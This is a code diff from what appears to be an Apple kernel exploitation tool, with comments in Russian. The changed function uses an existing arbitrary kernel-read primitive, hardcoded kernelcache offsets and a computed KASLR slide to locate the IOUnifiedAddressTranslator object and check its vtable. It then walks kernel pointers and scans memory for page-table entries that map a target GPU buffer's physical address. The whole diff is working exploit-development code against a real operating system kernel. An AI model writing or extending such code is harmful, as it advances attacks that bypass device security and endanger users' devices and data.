@@ -5405,31 +5405,22 @@ static void kpDumpPtrFields(NSMutableString *r, uint64_t objVA, const char *name
             }
         }
 
-        // 6. IOUAT: корни таблиц в глобале 0xaad63e0; pd=VA[35:25], pt=VA[24:14].
-        //    Дерефы только в heap-полосе 0xffffffdf… и kernelcache — иначе
-        //    аппаратный ресет без паники (проверено больно).
+        // 6. IOUAT: mux+0x10 = IOUnifiedAddressTranslator (наш девайс на нём).
+        //    Дампим его поля и гуляем по указателям, ища наш PA (маска 42 бита).
         uint64_t kbase2 = kconstant(base);
         uint64_t slide2 = kbase2 - 0xfffffff007004000;
-        uint64_t idxVal = 0; kreadbuf(kbase2 + (0xaa2c418 - 0xfffffff007004000), &idxVal, 8);
-        uint8_t shiftByte = 0; kreadbuf(kbase2 + (0xaa2c410 - 0xfffffff007004000), &shiftByte, 1);
         uint64_t gpuVA = gBufGPUVA;
-        kpNote(r, [NSString stringWithFormat:@"  IOUAT: idxGlobal=%#llx shiftByte=%u gpuVA=%#llx", idxVal, shiftByte, gpuVA]);
-        uint64_t roots = kbase2 + (0xaad63e0 - 0xfffffff007004000);
-        NSMutableString *rl = [NSMutableString stringWithString:@"  roots:"];
-        for (int i = 0; i < 32; i++) {
-            uint64_t rv = kp_untag_ptr(kp_rc_kread64(roots + i * 8));
-            [rl appendFormat:@" [%d]=%#llx", i, rv];
-        }
-        kpNote(r, rl);
-        // наш root: idx = gpuVA >> 36
-        uint32_t ridx = (uint32_t)(gpuVA >> 36);
-        uint64_t root = kp_untag_ptr(kp_rc_kread64(roots + (uint64_t)ridx * 8));
-        kpNote(r, [NSString stringWithFormat:@"  root[%u]=%#llx", ridx, root]);
-        if (kpLooksLikeKernelPointer(root)) {
-            // дамп root-структуры + follow указателей (2 уровня), скан на pa0
-            uint64_t visited[64]; int nv = 0;
-            uint64_t queue[64]; int nq = 0;
-            queue[nq++] = root;
+        uint64_t uat = kp_untag_ptr(kp_rc_kread64(mux + 0x10));
+        uint64_t uvt = kpLooksLikeKernelPointer(uat) ? kp_untag_ptr(kp_rc_kread64(uat)) : 0;
+        uint64_t expectU = 0xfffffff007b34568 + slide2;
+        kpNote(r, [NSString stringWithFormat:@"  IOUAT @ %#llx vtable=%#llx (ждём %#llx → %@)",
+                   uat, uvt, expectU, uvt == expectU ? @"СОВПАЛО" : @"другой класс"]);
+        kpNote(r, [NSString stringWithFormat:@"  gart+0x278=%#llx gart+0x280=%#llx gpuVA=%#llx",
+                   kp_rc_kread64(gart + 0x278), kp_rc_kread64(gart + 0x280), gpuVA]);
+        if (kpLooksLikeKernelPointer(uat)) {
+            uint64_t visited[96]; int nv = 0;
+            uint64_t queue[96]; int nq = 0;
+            queue[nq++] = uat;
             for (int depth = 0; depth < 3 && nq; depth++) {
                 int lvl = nq; nq = 0;
                 for (int q = 0; q < lvl; q++) {
@@ -5438,16 +5429,20 @@ static void kpDumpPtrFields(NSMutableString *r, uint64_t objVA, const char *name
                     for (int v = 0; v < nv; v++) if (visited[v] == obj) { dup = YES; break; }
                     if (dup) continue;
                     visited[nv++] = obj;
+                    uint32_t scanSize = (depth == 0) ? 0x578 : 0x400;
                     NSMutableString *dl = [NSMutableString stringWithFormat:@"  L%d obj %#llx:", depth, obj];
-                    for (uint32_t o = 0; o < 0x400; o += 8) {
+                    int ptrs = 0;
+                    for (uint32_t o = 0; o < scanSize; o += 8) {
                         uint64_t e = kp_rc_kread64(obj + o);
-                        BOOL hitRaw = ((e & 0xFFFFFFFFC000ULL) == (pa0 & 0xFFFFFFFFC000ULL)) && (e & ~0x3fffULL) && pa0;
-                        if (hitRaw) [dl appendFormat:@" +%#x=%#llx←PTE!", o, e];
+                        BOOL hit = pa0 && ((e & 0x0003FFFFFFFFC000ULL) == (pa0 & 0x0003FFFFFFFFC000ULL));
+                        if (hit) [dl appendFormat:@" +%#x=%#llx←PTE!", o, e];
                         uint64_t eu = kp_untag_ptr(e);
-                        if (kpLooksLikeKernelPointer(eu) && nq < 60 &&
+                        if (kpLooksLikeKernelPointer(eu) && nq < 90 && ptrs < 40 &&
                             ((eu >> 40) == 0xffffffdfULL >> 32 || (eu >> 40) == 0xffffffe0ULL >> 32 || (eu >> 40) == 0xffffffe1ULL >> 32 ||
                              (eu >= slide2 + 0xfffffff007004000 && eu < slide2 + 0xfffffff007004000 + 0x4000000))) {
                             queue[nq++] = eu;
+                            if (depth == 0) [dl appendFormat:@" +%#x→%#llx", o, eu];
+                            ptrs++;
                         }
                     }
                     kpNote(r, dl);
